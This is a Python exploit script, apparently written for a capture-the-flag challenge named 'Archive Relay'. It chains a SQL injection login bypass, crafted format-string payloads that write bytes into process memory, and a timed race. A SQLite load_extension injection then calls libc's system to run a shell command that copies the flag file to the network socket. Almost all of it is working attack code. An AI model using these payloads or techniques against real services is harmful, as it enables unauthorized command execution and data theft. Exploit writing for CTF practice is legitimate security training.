#!/usr/bin/env python3
"""Archive Relay post-system exploit/probe helpers (flag-path agent)."""

from __future__ import annotations

import argparse
import http.client
from pathlib import Path
import re
import select
import socket
import subprocess
import time
import urllib.parse


def request(port: int, method: str, path: str, *, headers=None, body: bytes = b""):
    conn = http.client.HTTPConnection("127.0.0.1", port, timeout=5)
    conn.request(method, path, body=body, headers=headers or {})
    response = conn.getresponse()
    data = response.read()
    conn.close()
    return response.status, data


def login(port: int) -> str:
    body = (
        b"account=x%2527%2520OR%2520role%253D%2527operator%2527"
        b"%2520%252D%252D%2520&pin=x"
    )
    status, data = request(
        port,
        "POST",
        "/api/login",
        headers={"Content-Type": "application/x-www-form-urlencoded"},
        body=body,
    )
    if status != 200:
        raise RuntimeError((status, data))
    match = re.search(rb'"session":"([0-9a-f]+)"', data)
    if not match:
        raise RuntimeError(data)
    return match.group(1).decode()


def trace(port: int, session: str, note: str) -> tuple[int, bytes]:
    return request(
        port,
        "POST",
        "/api/trace",
        headers={"X-Session": session, "X-Trace-Note": note},
    )


def positional_probe(start: int, end: int) -> str:
    # Two hexadecimal-looking digits immediately after '%' satisfy the edge
    # validator; wider indices naturally begin with two decimal/hex digits.
    fields = []
    for position in range(start, end + 1):
        if position < 10:
            spec = f"%0{position}$p"
        else:
            spec = f"%{position}$p"
        fields.append(f"{position}={spec}")
    return ",".join(fields)


def write_note(
    target_offset: int,
    value: int,
    final_spec: str,
    *,
    prefix_len: int = 67,
    db_low: int = 0x08,
    tail_width: int = 0,
) -> str:
    """Retarget arg179 through arg153, then perform one DB write."""
    target_low = (db_low + target_offset) & 0xFF
    first_width = (target_low - prefix_len) & 0xFF
    if first_width == 0:
        first_width = 256
    first_count = prefix_len + first_width
    if final_spec == "hhn":
        second_width = (value - first_count) & 0xFF
        if second_width == 0:
            second_width = 256
    elif final_spec in {"hn", "n"}:
        second_width = value - first_count
        if second_width <= 0:
            raise ValueError((value, first_count))
    else:
        raise ValueError(final_spec)

    chunks = [f"%{first_width}c"]
    chunks.extend(["%.s"] * 151)          # args2..152
    chunks.append("%hhn")                 # arg153: arg179 -> db+offset
    chunks.append(f"%{second_width}c")    # arg154
    chunks.extend(["%.s"] * 24)           # args155..178
    chunks.append(f"%{final_spec}")       # arg179: DB write
    if tail_width:
        chunks.append(f"%{tail_width}c")  # arg180: hold shared audit mutex
    note = "".join(chunks)
    if len(note) > 760:
        raise AssertionError(len(note))
    return note


def final_audit_note(prefix_len: int = 67, socket_fd: int = 6) -> str:
    """Emit a cp line and finish db[0:2] = ``b'sh'`` with one %hn.

    A preceding trace writes db[2:6] = ``b' *\\0\\0'``.  After the %hn,
    a bounded 500KB pad keeps this worker inside fprintf so the racing
    load_extension thread can call system while the command is complete.
    """
    if prefix_len != 67:
        raise ValueError("this compact layout assumes a one-digit worker/count prefix")
    chunks = ["%199c"]                       # arg1: count 266, low LF
    chunks.extend(["%.s"] * 135)            # args2..136
    chunks.append("%hhn")                    # arg137 -> arg185 = LF
    chunks.append("%254c")                   # arg138, count low db+0 (0x08)
    chunks.extend(["%.s"] * 14)             # args139..152
    chunks.append("%hhn")                    # arg153 -> arg179 = db+0
    chunks.append("%2c")                     # arg154, count low LF
    chunks.extend(["%.s"] * 9)              # args155..163
    chunks.append("%hhn")                    # arg164 -> arg183 = LF
    chunks.extend(["%.s"] * 5)              # args165..169
    chunks.append("%hhn")                    # arg170 -> arg177 = LF
    chunks.extend(["%.s"] * 6)              # args171..176
    chunks.append("%c")                      # arg177 -> LF, count 523
    chunks.append(f"cp /flag /proc/self/fd/{socket_fd} ")
    chunks.append("%31$c")                   # fixed '#' begins shell comment
    chunks.append("%07$26190c")              # total count 0x6873
    chunks.append("%179$hn")                 # db[0:2] = 's', 'h'
    chunks.append("%183$c")                  # cached LF ends comment
    chunks.append("cp /flag /proc/self/fd/6 ")
    chunks.append("%31$c")                   # comment second command's padding
    chunks.append("%07$500000c")             # post-write race window
    chunks.append("%185$c")                  # cached LF
    note = "".join(chunks)
    if len(note) > 760:
        raise AssertionError(len(note))
    return note


def trigger_load_extension(host: str, port: int) -> bytes:
    sql = "x' UNION SELECT load_extension('/lib/x86_64-linux-gnu/libc.so.6','system') -- "
    # One form decode plus the target's repeated account canonicalization.
    account = urllib.parse.quote(urllib.parse.quote(sql, safe=""), safe="")
    body = f"account={account}&pin=x".encode()
    wire = (
        f"POST /api/login HTTP/1.1\r\n"
        f"Host: {host}:{port}\r\n"
        "Content-Type: application/x-www-form-urlencoded\r\n"
        f"Content-Length: {len(body)}\r\n"
        "Connection: close\r\n\r\n"
    ).encode() + body
    captured = bytearray()
    with socket.create_connection((host, port), timeout=5) as sock:
        sock.sendall(wire)
        sock.settimeout(2)
        while True:
            try:
                chunk = sock.recv(4096)
            except socket.timeout:
                break
            if not chunk:
                break
            captured.extend(chunk)
    return bytes(captured)


def raw_trace_request(host: str, port: int, session: str, note: str) -> bytes:
    return (
        f"POST /api/trace HTTP/1.1\r\n"
        f"Host: {host}:{port}\r\n"
        f"X-Session: {session}\r\n"
        f"X-Trace-Note: {note}\r\n"
        "Content-Length: 0\r\n"
        "Connection: close\r\n\r\n"
    ).encode()


def raw_trigger_request(host: str, port: int) -> bytes:
    sql = "x' UNION SELECT load_extension('/lib/x86_64-linux-gnu/libc.so.6','system') -- "
    account = urllib.parse.quote(urllib.parse.quote(sql, safe=""), safe="")
    body = f"account={account}&pin=x".encode()
    return (
        f"POST /api/login HTTP/1.1\r\n"
        f"Host: {host}:{port}\r\n"
        "Content-Type: application/x-www-form-urlencoded\r\n"
        f"Content-Length: {len(body)}\r\n"
        "Connection: close\r\n\r\n"
    ).encode() + body


def recv_all(sock: socket.socket, timeout: float = 1.0) -> bytes:
    result = bytearray()
    sock.settimeout(timeout)
    while True:
        try:
            part = sock.recv(4096)
        except (socket.timeout, ConnectionResetError):
            break
        if not part:
            break
        result.extend(part)
    return bytes(result)


def race_final_traces(
    host: str,
    port: int,
    session: str,
    notes: list[str],
    trigger_after_trace: float,
) -> tuple[bytes, bytes]:
    # Connect the login socket first so it receives the stable server FD 6.
    login_sock = socket.create_connection((host, port), timeout=3)
    time.sleep(0.005)
    trace_socks = [socket.create_connection((host, port), timeout=3) for _ in notes]
    login_wire = raw_trigger_request(host, port)
    trace_wires = [raw_trace_request(host, port, session, note) for note in notes]

    def send_traces() -> None:
        for sock, wire in zip(trace_socks, trace_wires):
            sock.sendall(wire)

    start = time.perf_counter()
    if trigger_after_trace >= 0:
        send_traces()
        # A readable 202 response means each request was parsed and its worker
        # was queued.  This keeps the final waiter ahead of xDlSym on the
        # shared mutex instead of relying only on socket-send order.
        pending = set(trace_socks)
        queue_deadline = time.perf_counter() + 0.25
        while pending and time.perf_counter() < queue_deadline:
            ready, _, _ = select.select(list(pending), [], [], 0.001)
            pending.difference_update(ready)
        target = time.perf_counter() + trigger_after_trace
        while time.perf_counter() < target:
            pass
        login_sock.sendall(login_wire)
    else:
        login_sock.sendall(login_wire)
        target = start - trigger_after_trace
        while time.perf_counter() < target:
            pass
        send_traces()
    login_data = recv_all(login_sock)
    trace_data = b"\n---NEXT-TRACE---\n".join(recv_all(sock) for sock in trace_socks)
    login_sock.close()
    for sock in trace_socks:
        sock.close()
    return login_data, trace_data


def exploit(
    host: str,
    port: int,
    *,
    prefix_len: int = 67,
    socket_fd: int = 6,
    race_delay: float | None = None,
) -> bytes:
    if host not in {"127.0.0.1", "localhost"}:
        raise ValueError("trace helper currently uses local HTTPConnection")
    session = login(port)
    notes = [
        write_note(0x32, 0x07, "hhn", prefix_len=prefix_len),
        # 0x092a20 -> b' *\\t\\0': the 600KB pre-write span is also the
        # mutex gate while pVfs is still intact.
        write_note(0x02, 0x092A20, "n", prefix_len=prefix_len, tail_width=500000),
        final_audit_note(prefix_len, socket_fd),
    ]
    # Only the flag-enabling write is safe before load_extension resolves the
    # entrypoint.  The remaining snapshots form gate -> db[2:6] -> db[0:2].
    for index, note in enumerate(notes[:1], 1):
        status, data = trace(port, session, note)
        print(f"trace{index}: status={status} note_len={len(note)} body={data!r}")
        if status != 202:
            raise RuntimeError((index, status, data))
        time.sleep(0.08)
    if race_delay is None:
        for index, note in enumerate(notes[1:], 2):
            status, data = trace(port, session, note)
            print(f"trace{index}: status={status} note_len={len(note)} body={data!r}")
            time.sleep(0.08)
        return trigger_load_extension(host, port)
    race_notes = notes[1:]
    login_data, trace_data = race_final_traces(host, port, session, race_notes, race_delay)
    print(f"trace_race_raw={trace_data!r}")
    return login_data + b"\n---TRACE-SOCKET---\n" + trace_data


def local_race_sweep(binary: str, delays_us: list[int], base_port: int = 18100) -> None:
    workdir = "/tmp/archive_flag_race"
    for index, delay_us in enumerate(delays_us):
        port = base_port + index
        process = subprocess.Popen(
            [binary, str(port)],
            cwd=workdir,
            stdin=subprocess.DEVNULL,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )
        try:
            deadline = time.monotonic() + 2
            while True:
                try:
                    with socket.create_connection(("127.0.0.1", port), timeout=0.05):
                        break
                except OSError:
                    if time.monotonic() >= deadline:
                        raise
            data = exploit(
                "127.0.0.1",
                port,
                race_delay=delay_us / 1_000_000,
            )
            match = re.search(rb"(?:FLAG|flag|UHCON)\{[^}\r\n]+\}", data)
            print(f"SWEEP delay_us={delay_us} rc={process.poll()} flag={match.group(0) if match else None} data={data[:200]!r}")
            if match:
                return
        except Exception as error:
            print(f"SWEEP delay_us={delay_us} rc={process.poll()} error={error!r}")
        finally:
            if process.poll() is None:
                process.terminate()
                try:
                    process.wait(timeout=1)
                except subprocess.TimeoutExpired:
                    process.kill()


def main() -> None:
    parser = argparse.ArgumentParser()
    parser.add_argument("--port", type=int, default=18083)
    parser.add_argument("--probe", nargs=2, type=int, metavar=("START", "END"))
    parser.add_argument("--note")
    parser.add_argument("--final-note", action="store_true")
    parser.add_argument("--prefix-len", type=int, default=67)
    parser.add_argument("--socket-fd", type=int, default=6)
    parser.add_argument("--exploit", action="store_true")
    parser.add_argument("--race-delay-us", type=int)
    parser.add_argument("--race-sweep", nargs="+", type=int)
    parser.add_argument(
        "--binary",
        default=str(Path(__file__).resolve().parent / "package" / "deploy" / "prob"),
    )
    args = parser.parse_args()

    if args.race_sweep:
        local_race_sweep(args.binary, args.race_sweep, args.port)
        return
    if args.exploit:
        captured = exploit(
            "127.0.0.1",
            args.port,
            prefix_len=args.prefix_len,
            socket_fd=args.socket_fd,
            race_delay=(None if args.race_delay_us is None else args.race_delay_us / 1_000_000),
        )
        print(captured)
        match = re.search(rb"(?:FLAG|flag|UHCON)\{[^}\r\n]+\}", captured)
        if match:
            print(f"FLAG={match.group().decode(errors='replace')}")
        return

    session = login(args.port)
    if args.probe:
        note = positional_probe(*args.probe)
    elif args.final_note:
        note = final_audit_note(args.prefix_len, args.socket_fd)
    elif args.note is not None:
        note = args.note
    else:
        raise SystemExit("provide --probe START END or --note NOTE")
    if len(note) > 760:
        raise SystemExit(f"note too long: {len(note)}")
    print(f"session={session} note_len={len(note)}")
    print(trace(args.port, session, note))


if __name__ == "__main__":
    main()
